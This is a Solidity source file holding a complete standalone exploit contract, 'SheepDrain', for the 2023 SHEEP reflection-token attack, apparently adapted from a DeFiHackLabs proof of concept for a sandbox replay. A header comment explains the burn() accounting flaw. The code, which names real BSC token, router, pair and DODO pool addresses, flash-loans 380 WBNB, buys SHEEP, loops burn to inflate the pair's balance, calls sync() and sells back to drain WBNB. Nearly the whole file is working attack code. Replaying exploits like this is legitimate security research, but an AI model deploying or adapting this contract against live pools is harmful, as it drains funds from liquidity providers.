// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-02-Sheep).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (Exploit IS the Test; the DODO DPP flash-loan callback
// `DPPFlashLoanCall` lives on the test itself, `address(this)` is the
// attacker throughout) -- there is no standalone exploit contract to deploy.
// This is a faithful, self-contained copy of that inline attack (testExploit
// -> run, DPPFlashLoanCall unchanged) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/Sheep_exp.sol in the registry.
//
// Root cause: SHEEP (`CoinToken`, an RFI-style reflection token) tracks
// balances in two parallel spaces -- a huge "reflection" space (`_rOwned`,
// `_rTotal`) and a human-readable "true" space (`_tOwned`, `_tTotal`).
// `balanceOf(acc) = _rOwned[acc] / currentRate`, `currentRate = _rTotal /
// _tTotal`. Its permissionless `burn(uint256 _value)` does
// `_rOwned[caller] -= _value; _tTotal -= _value;` -- it subtracts a t-space
// amount straight out of an r-space balance and NEVER decrements `_rTotal`.
// Each burn removes a negligible sliver of the caller's r-balance while
// shrinking `_tTotal` by a full t-unit, so `currentRate` rises and every
// other holder's `balanceOf` (computed off the same rising rate) is
// distorted upward -- including the SHEEP/WBNB pair's `balanceOf`, even
// though no tokens ever moved into the pair. Looping `burn(balanceOf(this))`
// while the pair's `balanceOf` still exceeds dust, then calling `Pair.sync()`,
// commits the distorted balance as the pair's new cached reserve (still
// backed by the pair's real, untouched WBNB reserve). Selling the leftover
// SHEEP back through the router against the now wildly mispriced reserve
// drains real WBNB out of the pair.

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface RDeflationERC20 is IERC20Like {
    function burn(uint256 amount) external;
}

interface DVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface Uni_Router_V2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface Uni_Pair_V2 {
    function sync() external;
}

contract SheepDrain {
    RDeflationERC20 SHEEP = RDeflationERC20(0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4);
    IERC20Like WBNB = IERC20Like(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x912DCfBf1105504fB4FF8ce351BEb4d929cE9c24);
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;

    // step 0: flashloan 380 WBNB from the DODO DPP pool; DPPFlashLoanCall does the drain.
    function run() external {
        DVM(dodo).flashLoan(380 * 1e18, 0, address(this), new bytes(1));
    }

    // Callback from the DODO DPP pool.
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        // step 1: swap the flash-loaned WBNB for SHEEP, taking a large
        // position in the reflection token.
        WBNBToSHEEP();

        // step 2: loop burn(fullBalance) while the pair still holds more
        // than dust SHEEP. Each burn shrinks _tTotal (but not _rTotal),
        // inflating currentRate and therefore the pair's computed balanceOf
        // -- with no tokens ever transferred into the pair.
        while (SHEEP.balanceOf(address(Pair)) > 2) {
            uint256 burnAmount = SHEEP.balanceOf(address(this));
            SHEEP.burn(burnAmount);
        }

        // step 3: commit the distorted balanceOf as the pair's new cached
        // reserve -- still backed by the pair's real, untouched WBNB.
        Pair.sync();

        // step 4: sell the leftover SHEEP back through the router; the swap
        // is priced against the now wildly mispriced reserve and drains
        // real WBNB out of the pair.
        SHEEPToWBNB();

        // step 5: repay the flash loan; whatever WBNB remains is the profit.
        WBNB.transfer(dodo, 380 * 1e18);
    }

    function WBNBToSHEEP() internal {
        WBNB.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SHEEP);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function SHEEPToWBNB() internal {
        SHEEP.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(SHEEP);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SHEEP.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
